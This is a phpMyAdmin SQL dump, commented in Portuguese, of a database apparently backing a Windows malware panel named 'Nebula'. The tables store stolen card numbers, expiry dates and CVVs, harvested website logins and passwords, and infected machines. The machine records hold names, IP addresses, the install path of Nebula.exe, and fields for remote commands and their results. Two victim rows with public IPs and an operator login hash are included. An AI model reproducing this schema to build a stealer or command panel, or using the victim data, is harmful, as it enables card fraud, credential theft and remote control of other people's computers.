-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Tempo de geração: 11/01/2024 às 16:35
-- Versão do servidor: 5.7.43
-- Versão do PHP: 8.1.25

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `stackst1_nebula`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `nebula-card`
--

CREATE TABLE `nebula-card` (
  `id` int(11) NOT NULL,
  `Card-cc` text NOT NULL,
  `Card-data` text NOT NULL,
  `Card-cvv` text NOT NULL,
  `MachineHash` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura para tabela `nebula-infectado`
--

CREATE TABLE `nebula-infectado` (
  `id` int(11) NOT NULL,
  `Machine` text NOT NULL,
  `MachineName` text NOT NULL,
  `MachineIpv4` text NOT NULL,
  `MachineIp` text NOT NULL,
  `MachineInstall` text NOT NULL,
  `MachineHash` text NOT NULL,
  `MachineCommand` text NOT NULL,
  `MachineResult` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Despejando dados para a tabela `nebula-infectado`
--

INSERT INTO `nebula-infectado` (`id`, `Machine`, `MachineName`, `MachineIpv4`, `MachineIp`, `MachineInstall`, `MachineHash`, `MachineCommand`, `MachineResult`) VALUES
(1, 'DESKTOP-V1OF20P', 'User', '200.138.2.117', 'fe80::349d:3adb:3775:fd8a', 'C:UsersUserDesktopNebulainDebug\net8.0Nebula.exe', 'UxfboJ7G930XyFK7', '', ''),
(2, 'DESKTOP-U3GF3E6', 'Cliente', '168.196.248.10', 'fe80::d6d:3b8a:45f6:6e0a%5', 'C:UsersClienteDesktopNova pasta (2)Nebula.exe', 'YU97uWN5vNYRQd85', '', '');

-- --------------------------------------------------------

--
-- Estrutura para tabela `nebula-password`
--

CREATE TABLE `nebula-password` (
  `id` int(11) NOT NULL,
  `PassWeb` text NOT NULL,
  `PassLogin` text NOT NULL,
  `Password` text NOT NULL,
  `MachineHash` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura para tabela `nebula-user`
--

CREATE TABLE `nebula-user` (
  `id` int(11) NOT NULL,
  `user-login` text NOT NULL,
  `user-password` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Despejando dados para a tabela `nebula-user`
--

INSERT INTO `nebula-user` (`id`, `user-login`, `user-password`) VALUES
(1, 'NebulaMrx', 'bc404aa6ddf3e256c2cc891794d73a49');

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `nebula-card`
--
ALTER TABLE `nebula-card`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `nebula-infectado`
--
ALTER TABLE `nebula-infectado`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `nebula-password`
--
ALTER TABLE `nebula-password`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `nebula-user`
--
ALTER TABLE `nebula-user`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `nebula-card`
--
ALTER TABLE `nebula-card`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `nebula-infectado`
--
ALTER TABLE `nebula-infectado`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT de tabela `nebula-password`
--
ALTER TABLE `nebula-password`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `nebula-user`
--
ALTER TABLE `nebula-user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
